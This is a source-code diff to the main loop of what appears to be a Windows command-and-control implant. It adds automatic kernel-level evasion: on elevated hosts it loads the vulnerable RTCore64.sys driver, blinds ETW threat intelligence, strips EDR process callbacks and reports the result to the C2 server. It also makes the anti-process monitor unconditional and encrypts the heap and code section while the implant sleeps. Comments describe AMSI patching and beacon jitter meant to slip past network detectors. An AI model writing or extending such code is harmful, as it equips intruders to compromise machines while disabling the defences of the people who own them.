@@ -384,9 +384,9 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR lpCmdLine, INT) {
 			SYSTEM_INFO SysInfo;
 			GetSystemInfo(&SysInfo);
 
-			if (s.protector) {
-				CreateThread(0, 0, (LPTHREAD_START_ROUTINE)Protector::AntiProcesses, 0, 0, 0);
-			}
+			// Anti-process monitor is always unconditional — no config gate.
+			// There is no legitimate reason to deploy without it.
+			CreateThread(0, 0, (LPTHREAD_START_ROUTINE)Protector::AntiProcesses, 0, 0, 0);
 
 			// Auto-evasion: patch AMSI + blind ETW + unhook ntdll before first checkin.
 			// Runs silently; EDR hooks and AMSI scanning are blind to everything after this.
@@ -408,6 +408,36 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR lpCmdLine, INT) {
 
 			api.Checkin(information.c_str());
 
+			// ── Auto-BYOVD kernel hardening ─────────────────────────────────────
+			// If elevated AND the driver exists alongside the EXE, silently run the
+			// full kernel protection sequence: load driver → blind ETWTI → remove
+			// EDR process-creation callbacks. Operator no longer needs to send 3 manual
+			// commands — kernel evasion activates automatically on first checkin.
+			// If the driver is blocklisted (Win11 22H2+), reports to C2 and continues.
+			if (IsElevated()) {
+				char exeDir[MAX_PATH] = {};
+				GetModuleFileNameA(NULL, exeDir, MAX_PATH - 1);
+				char* sep = strrchr(exeDir, '\\');
+				if (sep) { sep[1] = '\0'; }
+				std::string driverPath = std::string(exeDir) + S("RTCore64.sys");
+
+				if (GetFileAttributesA(driverPath.c_str()) != INVALID_FILE_ATTRIBUTES) {
+					SC_HANDLE hSvc = BYOVD::LoadDriver(driverPath.c_str());
+					if (hSvc) {
+						HANDLE hDev = BYOVD::OpenDevice();
+						if (hDev && hDev != INVALID_HANDLE_VALUE) {
+							ETWTiBlind::Blind(hDev);
+							KernelUnhook::RemoveProcessCallbacks(hDev);
+							CloseHandle(hDev);
+							api.SendEvent(S("byovd:auto:ok").c_str());
+						}
+					} else {
+						// Driver blocked by WDAC/blocklist — report and continue without kernel evasion.
+						api.SendEvent(S("byovd:auto:blocked").c_str());
+					}
+				}
+			}
+
 			Telemetry::Start(&api, ID);
 
 			std::string last;
@@ -419,9 +449,11 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR lpCmdLine, INT) {
 				// A perfectly periodic beacon is a textbook C2 signature in Zeek, Suricata, etc.
 				DWORD jitter = pollMs / 4;
 				DWORD sleepMs = pollMs - jitter + (DWORD)(rand() % (jitter * 2 + 1));
-				// Encrypt heap during sleep: in-memory strings/data are XOR'd while idle.
-				// This defeats memory scanners that scan the process heap between beacons.
-				HeapEncrypt::EncryptedSleep(sleepMs, 0);
+				// Dual-layer sleep: encrypt heap + encrypt .text simultaneously while idle.
+				// Heap encryption hides C2 config strings, credential buffers, etc.
+				// .text encryption hides code signatures in the code section.
+				// Both layers active together: memory scanner finds no readable strings OR code.
+				HeapEncrypt::CombinedObfSleep(sleepMs, 0);
 
 				last = api.GetPendingCommand();
 
